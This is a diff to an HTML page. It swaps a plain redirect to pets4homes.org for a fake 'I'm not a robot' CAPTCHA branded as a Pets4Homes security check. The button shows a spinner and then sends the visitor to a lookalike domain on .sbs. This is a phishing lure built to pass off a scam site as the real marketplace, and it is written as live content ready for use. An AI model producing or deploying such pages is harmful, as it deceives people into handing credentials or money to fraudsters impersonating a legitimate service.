@@ -1,11 +1,107 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="refresh" content="0; url=https://pets4homes.org/24526685806930">
-  <title>Redirecting...</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>pets4homes safety check</title>
+<style>
+  body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    background: radial-gradient(circle at 20% 30%, #22c55e33, transparent 60%),
+                radial-gradient(circle at 80% 70%, #3b82f633, transparent 60%),
+                #0f172a;
+    font-family: "Inter", system-ui, sans-serif;
+    color: #fff;
+    text-align: center;
+  }
+
+  h1 {
+    font-size: 1.6rem;
+    margin-bottom: 1rem;
+    color: #e2e8f0;
+  }
+
+  .captcha-box {
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 14px;
+    padding: 40px 60px;
+    box-shadow: 0 0 30px rgba(0,0,0,0.3);
+    backdrop-filter: blur(8px);
+  }
+
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    padding: 14px 26px;
+    background: linear-gradient(90deg, #22c55e, #16a34a);
+    border: none;
+    border-radius: 12px;
+    color: #fff;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    box-shadow: 0 4px 18px rgba(34,197,94,0.25);
+    transition: all 0.25s ease;
+  }
+
+  .btn:hover {
+    transform: scale(1.05);
+    box-shadow: 0 6px 24px rgba(34,197,94,0.35);
+  }
+
+  .loader {
+    width: 26px;
+    height: 26px;
+    border: 3px solid rgba(255,255,255,0.3);
+    border-top-color: #22c55e;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    display: none;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  footer {
+    position: fixed;
+    bottom: 14px;
+    font-size: 0.8rem;
+    color: #64748b;
+  }
+</style>
 </head>
 <body>
-  <p>Redirecting to <a href="https://pets4homes.org/24526685806930">pets4homes.org</a>...</p>
+
+  <div class="captcha-box">
+    <h1>Confirm that you are not a robot</h1>
+    <button class="btn" id="captchaBtn">
+      ✅ I'm not a robot
+    </button>
+    <div class="loader" id="loader"></div>
+  </div>
+
+  <footer>© 2025 Pets4Homes Security Check</footer>
+
+<script>
+  const btn = document.getElementById('captchaBtn');
+  const loader = document.getElementById('loader');
+
+  btn.addEventListener('click', () => {
+    btn.style.display = 'none';
+    loader.style.display = 'inline-block';
+    setTimeout(() => {
+      window.location.href = "https://pets4homes.id-874219.sbs/-W8_kSTZr";
+    }, 1500);
+  });
+</script>
+
 </body>
 </html>
